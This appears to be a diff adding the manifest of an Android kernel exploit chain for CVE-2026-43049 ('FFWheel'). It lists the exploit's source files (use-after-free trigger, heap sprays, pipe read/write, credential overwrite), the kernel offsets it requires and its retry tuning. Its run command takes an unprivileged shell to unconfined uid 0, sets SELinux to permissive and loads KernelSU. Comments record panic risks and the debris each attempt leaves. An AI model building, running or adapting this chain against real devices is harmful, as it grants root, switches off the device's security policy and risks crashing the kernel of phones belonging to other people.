@@ -1,0 +1,190 @@
+# entry.ffwheel@6.1 — CVE-2026-43049 FFWheel, read-derived root.
+#
+# One binary (ffcompose) run as an unprivileged shell forks a child per half
+# (-DFFCOMPOSE):
+#   reader (ffread_mm) turns mm->mm_mt.ma_root + /proc/self/maps into a repeatable
+#     arbitrary read, and resolves everything the writer needs: cred,
+#     pipe_inode_info, and the writer's Trigger-1 forge page_va (page-table walk,
+#     lib/addr/pgwalk, verified against a magic the writer stamped, so the writer
+#     places deterministically and never writes at an unconfirmed page).
+#   writer (ffroot_w) reaches unconfined uid 0 by the two-write path: Trigger 1 a
+#     one-shot cred-identity merge (uid0 + caps) -> caps unlock /proc/self/pagemap
+#     -> Trigger 2 (FFROOT_ENFORCE0) enforce=0 on a pagemap-exact page ->
+#     finit_module, then ksud late-load.
+#
+# The writer page source is one flag: FFROOT_RESOLVED_PAGE (default, reader
+# page-table walk) / neither (physmap guess) / FFROOT_CROSSCACHE (kernel sk_buff
+# base). The remaining probabilistic step is the reader landing its own ma_root
+# page; a reader miss is a clean read-miss, a uhid reclaim-miss panics.
+
+schema = 1
+kind   = "entry"
+id     = "entry.ffwheel@6.1"
+cve    = "CVE-2026-43049"
+kmi    = ["android14-6.1"]
+
+
+composed = false
+status   = "root from unprivileged shell (uid/gid 2000->0, unconfined) then self-loaded KernelSU; deterministic writer, only the reader's own page is probabilistic"
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = ["cves/cve-2026-43049-ffwheel/ffcompose.c",
+           "cves/cve-2026-43049-ffwheel/ffread_mm.c",
+           "cves/cve-2026-43049-ffwheel/ffread_resolve.c",
+           "cves/cve-2026-43049-ffwheel/ffroot_w.c",
+           "cves/lib/spray/crosscache/crosscache.c",
+           "cves/lib/rw/pipe_rw.c",
+           "cves/lib/trigger/uhid.c",
+           "cves/lib/spray/physspray.c",
+           "cves/lib/spray/skbspray.c",
+           "cves/lib/root/kprobe_read.c",
+           "cves/lib/root/cred.c",
+           "cves/lib/root/kernelsu.c"]
+includes = ["cves"]             # resolves TARGET_HEADER
+depends  = ["cves/cve-2026-43049-ffwheel/ksnitch_mm.h",
+            "cves/cve-2026-43049-ffwheel/ffwheel_forge.h",
+            "cves/cve-2026-43049-ffwheel/ffread_resolve.h",
+            "cves/lib/spray/crosscache/crosscache.h",
+            "cves/lib/leak/kernelsnitch/kernelsnitch.h",
+            "cves/lib/root/kprobe_read.h",
+            "cves/lib/root/cred.h",
+            "cves/lib/rw/pipe_krw.h",
+            "cves/cve-2026-43049-ffwheel/ffcompose_ipc.h"]
+# KSNITCH_DETACHED_THREADS: writer runs KernelSnitch twice (own-mm leak +
+# crosscache) and the reader runs it too; detached small-stack leak threads keep
+# the instances from exhausting the address space.
+defines  = ["FFCOMPOSE", "KSNITCH_DETACHED_THREADS"]
+# -ffunction-sections/-fdata-sections + -Wl,--gc-sections are required: linking
+# crosscache.c pulls in KernelSnitch's pthread_create, which pulls in a
+# weakly-referenced GWP-ASan TLS symbol from bionic's static libc.a. Without
+# section GC that symbol underaligns the TLS segment and the binary refuses to
+# exec ("executable's TLS segment is underaligned ... needs to be at least 64 for
+# ARM64 Bionic"); the GC drops it and PT_TLS with it.
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-ffunction-sections", "-fdata-sections", "-Werror"]
+opt      = ["-O2", "-g0"]
+ldflags  = ["-Wl,--gc-sections"]
+output   = "cve-2026-43049-ffwheel"
+uses_target_header = true    # structure layouts and symbol offsets
+
+# What this chain reads out of the target description. Declared so that adding a
+# device fails the BUILD with a named, complete list instead of compiling against
+# whatever happens to be defined and putting a wrong address under a write that
+# runs as root.
+#
+# The split is what decides the porting cost. Everything from KIMAGE_TEXT_BASE
+# down is a field offset or a constant of the kernel interface, shared by every
+# device on that interface. The six above it are symbol offsets into one kernel
+# image, so they are identical for every device running the same GKI build and
+# have to be re-measured only when that build changes.
+[facts]
+header = "cves/targets/{target}/target.h"
+requires = [
+  "OFFSET_H", "BUILD_FINGERPRINT",
+  # image symbol offsets -- per kernel build
+  "EP_POLL_CALLBACK_OFF", "ANON_PIPE_BUF_OPS_OFF", "LINUX_BANNER_OFF",
+  "INPUT_DEV_LIST_OFF", "SELINUX_ENFORCING_OFF", "SELINUX_BLOB_SIZES_OFF",
+  # image geometry and the slide floor the recovery is checked against
+  "KIMAGE_TEXT_BASE", "KASLR_SLIDE_MIN", "P0_PAGE_OFFSET", "P0_PHYS_OFFSET",
+  # eventpoll: the objects the wake callback walks
+  "EPITEM_OFF_RDLLINK", "EPITEM_OFF_FFD", "EPITEM_OFF_EP", "EPITEM_OFF_WS",
+  "EPITEM_OFF_EVENT", "EPPOLL_OFF_BASE", "EPPOLL_OFF_WAIT", "EP_OFF_RDLLIST",
+  "EP_OFF_WQ", "EP_OFF_POLL_WAIT", "EP_OFF_LOCK", "EP_OFF_OVFLIST", "EP_OFF_WS",
+  "EP_UNACTIVE_PTR", "WAIT_QUEUE_HEAD_OFF", "WAIT_QUEUE_ENTRY_OFF_ENTRY",
+  # the pipe ring the write is aimed through
+  "PIPE_INODE_OFF_BUFS", "PIPE_BUFFER_SIZE", "PIPE_BUF_FLAG_CAN_MERGE",
+  "PIPE_INODE_OFF_HEAD", "PIPE_INODE_OFF_TAIL", "PIPE_INODE_OFF_RING_SIZE",
+  # the read walk: mm -> owner -> files -> fdt -> fd[] -> file -> private_data,
+  # and the page-table depth the forge page's own address is resolved through
+  "MM_OWNER_OFF", "MM_PGD_OFF", "VA_BITS", "TASK_CRED_OFF", "TASK_FILES_OFF",
+  "FILES_FDT_OFF", "FDT_FD_OFF", "FILE_PRIVATE_DATA_OFF",
+  # credentials
+  "CRED_UID_OFF", "CRED_CAPS_OFF", "CRED_CAP_WORDS", "CRED_ID_BLOCK_BYTES",
+  "CAP_FULL", "SELINUX_KERNEL_SID",
+  # the leaked input_dev the writer neutralises
+  "INPUT_DEV_NAME_OFF", "INPUT_DEV_USERS_OFF", "INPUT_DEV_NODE_OFF",
+  # mm_struct slab geometry, for the side-channel leak
+  "MM_STRUCT_SZ", "MM_ORDER",
+]
+forbids = []
+
+[properties]
+retry_safe  = true
+panic_risk  = { pre_slide = "high", post_slide = "high" }
+destructive = ["uhid UAF collateral (may panic InputReader)", "reader mm->mm_mt.ma_root overwritten (parks)", "cross-cache/guess miss -> panic"]
+restores    = []
+# The writer self-loads KernelSU while unconfined uid 0, so this entry provides
+# CAP_SU on its own -- no handoff stage. This is what makes the chain a root
+# (chain_has_su): the runner then consults the root oracle and stops on the
+# first success instead of hunting.
+provides      = ["CAP_SU"]
+requires_caps = []
+retains       = []
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/cve43049-ffcompose"
+mode = "755"
+# Writer placement via FFROOT_RESOLVED_PAGE (reader page-table walk). Boot-stable
+# KASLR base replayed via @KASLR_ENV@ (accepts_base; ffcompose handles KASLR_LEAK_ONLY).
+# FFROOT_KSUD/FFROOT_KMI/FFROOT_MANAGER_PKG: after unconfined uid0, exec ksud
+# late-load to load KernelSU. All three are the runner's, not this manifest's:
+# the ksud binary is the manager-matched one derive_ksud staged, the interface is
+# the one the running kernel resolved to, and the package is the manager the
+# operator selected (--manager, or detection). Naming any of them here would pin
+# the stage to one phone and one manager and load the wrong module elsewhere.
+# Empty (a hunt with no manager) means the half skips the load and says so.
+# FFROOT_TRIGGER_TRIES: the writer reads its forge page's witness cell after each
+# trigger and repeats the probe/free/reclaim while the redirect has not landed,
+# instead of firing the write blind on the first attempt. Safe to repeat here:
+# page_va is reader-resolved and verified, so every wake walks a page we own --
+# which is why this budget is generous. It has to be: the run that reached root
+# on its first shot took THREE triggers to land one, so a single attempt throws
+# away two shots in three. Each costs ~2s against a ~50s reboot.
+# FFWHEEL_READER_TRIES: the same witness on the reader side, and NOT the same
+# bargain. This half's page_va is a guess, so only the reclaim-missed outcome is
+# retryable -- that one leaves the kernel untouched, but the retry draws again on
+# the guess too, so it converts misses into roots and panics in whatever ratio
+# the guess has. Kept low for that reason.
+command = "cd @DEV_TMP@; FFROOT_RESOLVED_PAGE=1 FFROOT_TRIGGER_TRIES=8 FFWHEEL_READER_TRIES=3 FFROOT_ENFORCE0=1 FFROOT_NEUT=1 FFROOT_KSU_TRIES=3 FFROOT_KSUD=@DEV_KSUD@ FFROOT_KMI=@KMI@ FFROOT_MANAGER_PKG=@MANAGER_PKG@ @KASLR_ENV@@DEV_ENTRY@ > @DEV_LOG@ 2>&1"
+accepts_base = true
+needs_root = false
+
+[markers]
+pass = '(slide-kaslr-tracefs-ok pid=[0-9]+ base=[0-9a-f]+|FFROOT_W_ROOT uid=0)'
+gate_fail = 'FFROOT_W_NO_SUCH_GATE_FAIL'
+restore_pass = 'FFROOT_W_NO_SUCH_RESTORE_PASS'
+restore_bad  = 'FFROOT_W_NO_SUCH_RESTORE_BAD'
+heartbeat    = 'FFWHEEL_HEARTBEAT seq=[0-9]+'
+diag       = '(FFROOT_W_CROSS_LEAK_MISS|FFROOT_W_CROSS_DELIVER_MISS|FFROOT_W_MISS.*|no cred VA.*|no pipe_inode.*|FFREAD_MISS.*)'
+diag_count = ''
+# Terminal deadlock: a half died without the handoff its peer blocks on. The
+# runner kills the shot on this instead of waiting out the writer's ~4-min
+# WAITING_FOR_PI deadline (the reboot-per-shot loop clears what it leaves).
+stall      = 'STALL: .*will time out'
+
+[provides]
+caps  = ["CAP_SU"]
+field = 'base=[0-9a-f]+'
+label = "base"
+
+# Reboot before every shot. A shot's debris persists until reboot: a leaked
+# input_dev + hid_device (a live /dev/input/eventN with a dangling
+# hid->driver_data) and a parked half holding a redirected pipe->bufs and a
+# multi-GB spray that cannot be freed. On one boot that debris drains
+# MemAvailable (shrinking the spray budget and guess coverage shot over shot) and
+# eventually panics when init/system_server closes a stale node. A fresh boot
+# restores MemAvailable and clears the debris.
+[[setup]]
+reboot = true
+description = "fresh boot per shot: full MemAvailable and no leaked/parked-half debris"
+
+# No description: the echo carries the runtime detail a static description could
+# not, and the runner logs its output as one timestamped line.
+[[setup]]
+reboot = false
+command = "echo ffwheel-setup uptime=$(cut -d. -f1 /proc/uptime)s /dev/input node count $(ls /dev/input | wc -l)"
+needs_root = false
+once_per_boot = false
